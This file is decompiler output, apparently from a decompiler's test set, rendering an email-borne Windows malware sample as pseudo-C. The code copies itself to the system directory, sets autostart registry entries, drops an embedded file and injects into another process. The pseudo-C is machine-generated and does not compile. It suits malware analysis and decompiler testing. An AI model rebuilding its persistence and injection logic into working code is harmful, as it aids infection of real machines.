// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0050/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

word32 fn00401000(word32 ecx, word32 dwArg04, word32 dwArg08)
{
	Eq_3 edi_16 = dwArg04;
	Eq_5 * esi_18 = dwArg08;
	Eq_7 eax_21 = LoadLibraryA(dwArg04);
	if (eax_21 != 0x00000000)
		while (true)
		{
			ecx = ecx | 0xFFFFFFFF;
			do
			{
				if (ecx == 0x00000000)
					break;
				edi_16 = edi_16 + 0x00000001;
				ecx = ecx - 0x00000001;
			} while (0x00 != Mem0[edi_16 + 0x00000000:byte]);
			if (Mem0[edi_16 + 0x00000000:byte] == 0x00)
			{
				eax_21.u0 = 0x00000001;
				goto l0040103A;
			}
			eax_21 = GetProcAddress(eax_21, edi_16);
			esi_18->t0000 = eax_21;
			if (eax_21 == 0x00000000)
				goto l0040103A;
			esi_18 = esi_18 + 1;
		}
l0040103A:
	return eax_21;
}

word32 fn00401041(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 eax_23 = CreateFileA(dwArg04, 0x40000000, 0x00000003, 0x00000000, 0x00000002, 0x00000000, 0x00000000);
	if (eax_23 == 0x00000001)
		return eax_23 + 0x00000001;
	else
	{
		fp->dwFFFFFFF0 = 0x00000000;
		fp->dwFFFFFFEC = fp - 0x0000000C;
		fp->dwFFFFFFE8 = dwArg0C;
		fp->dwFFFFFFE4 = dwArg08;
		fp->dwFFFFFFE0 = eax_23;
		WriteFile(0x00000003, 0x00000000, 0x00000002, 0x00000000, 0x00000000);
		fp->dwFFFFFFF0 = eax_23;
		CloseHandle(0x00000000);
		return 0x00000001;
	}
}

void fn0040108D(word32 ecx, word32 dwArg04, word32 dwArg08)
{
	if (fn00401000(ecx, 0x00405E74, 0x00405EC8) != 0x00000000)
	{
		fp->dwFFFFFFDC = dwArg04;
		fp->dwFFFFFFD8 = 0x00000000;
		Eq_7 eax_64 = OpenProcess(0x0000043A, 0x00405E74, &globals->ptr405EC8);
		if (eax_64 != 0x00000000)
		{
			word32 eax_123 = lstrlenA(dwArg08);
			fp->dwFFFFFFD8 = 0x00001000;
			fp->dwFFFFFFD4 = eax_123;
			word32 esp_134 = fp + 0xFFFFFFCC;
			Mem131[0x00405EC8:word32]();
			if (eax_123 != 0x00000000)
			{
				word32 esp_179 = fp + 0xFFFFFFB8;
				Mem131[0x00405ED4:word32]();
				if (eax_123 != 0x00000000)
				{
					Eq_7 eax_212 = GetProcAddress(GetModuleHandleA(0x00405E74), 0x00405E67);
					esp_179 = fp + 0xFFFFFF9C;
					Mem131[0x00405ED0:word32]();
					if (eax_212 != 0x00000000)
					{
						WaitForSingleObject(eax_212, 0xFFFFFFFF);
						GetExitCodeThread(eax_212, fp - 0x0000001C);
						CloseHandle(eax_212);
						esp_179 = fp + 0xFFFFFF9C;
					}
				}
				Eq_188 * esp_196 = esp_179 - 0x00000004;
				esp_196->dw0000 = 0x00008000;
				esp_196->dw0000 = 0x00000000;
				esp_196->dw0000 = eax_123;
				esp_196->dw0000 = eax_64.u0;
				esp_134 = esp_196 - 0x0000000C;
				Mem203[0x00405ECC:word32]();
			}
			Eq_7 * esp_166 = esp_134 - 0x00000004;
			Mem167[esp_166 + 0x00000000:word32] = eax_64;
			CloseHandle(Mem167[esp_166 + 0x00000000:HANDLE]);
		}
l00401193:
		return;
	}
	else
	{
		fp->dwFFFFFFDC = 0x00405EDC;
		if (LoadLibraryA(0x00405EC8) != 0x00000000)
		{
l00401187:
			while (true)
				Sleep(0x00002710);
		}
		else
			goto l00401193;
	}
}

void fn00401198(word32 dwArg04)
{
	RegCreateKeyA(dwArg04, 0x00405E2B, fp - 0x00000008);
	RegSetValueExA(dwLoc08, 0x00403000, 0x00000000, 0x00000001, &globals->t405FE1, lstrlenA(0x00405FE1) + 0x00000001);
	RegCloseKey(dwLoc08);
	return;
}

void fn004011DD(word32 ecx)
{
fn004011DD_entry:
l004011DD:
	GetSystemDirectoryA(0x00405FE1, 0x00000104)
	lstrcatA(0x00405FE1, 0x0040300D)
	GetModuleFileNameA(0x00000000, 0x004060E6, 0x00000104)
	fn00401198(0x80000001)
	fn00401198(0x80000002)
	branch lstrcmpiA(0x004060E6, 0x00405FE1) == 0x00000000 l00401284
l00401233:
	fp->tFFFFFFFC.u0 = 0x00000080;
	fp->tFFFFFFFC.u0 = 0x00405FE1;
	SetFileAttributesA(0x004060E6, 0x00405FE1)
	fp->tFFFFFFFC.u0 = 0x00000000;
	fp->tFFFFFFFC.u0 = 0x00405FE1;
	fp->tFFFFFFFC.u0 = 0x004060E6;
	branch CopyFileA(0x00000000, 0x004060E6, 0x00405FE1) == 0x00000000 l0040127D
l00401257:
	fp->tFFFFFFFC.u0 = 0x00000080;
	fp->tFFFFFFFC.u0 = 0x00405FE1;
	SetFileAttributesA(0x00405FE1, 0x00000000)
	fp->tFFFFFFFC.u0 = 0x00000000;
	fp->tFFFFFFFC.u0 = 0x00000000;
	fp->tFFFFFFFC.u0 = 0x00000000;
	ShellExecuteA(0x00000000, 0x00405E26, 0x00405FE1, 0x004060E6, 0x00405FE1, 0x00000000)
l0040127D:
	fp->tFFFFFFFC.u0 = 0x00000000;
	ExitProcess(0x00000000)
l00401284:
	GetSystemDirectoryA(0x00405EDC, 0x00000104)
	lstrcatA(0x00405EDC, 0x0040301C)
	SetFileAttributesA(0x00405EDC, 0x00000080)
	branch fn00401041(0x00405EDC, 0x00403026, 0x00002E00) == 0x00000000 l004012F0
l004012C9:
	fp->tFFFFFFFC.u0 = 0x00000000;
	fp->tFFFFFFFC.u0 = 0x00405E59;
	Eq_329 eax_82 = FindWindowA(0x00403026, 0x00002E00)
	fp->tFFFFFFFC.u0 = 0x00405ED8;
	Mem87[fp - 0x00000008:word32] = eax_82
	GetWindowThreadProcessId(0x00403026, 0x00002E00)
	fp->tFFFFFFFC.u0 = 0x00405EDC;
	Mem93[fp - 0x00000008:word32] = Mem91[0x00405ED8:word32]
	fn0040108D(ecx, 0x00403026, 0x00002E00)
l004012F0:
	ExitProcess(0x00000000)
	int3()
fn004011DD_exit:
}

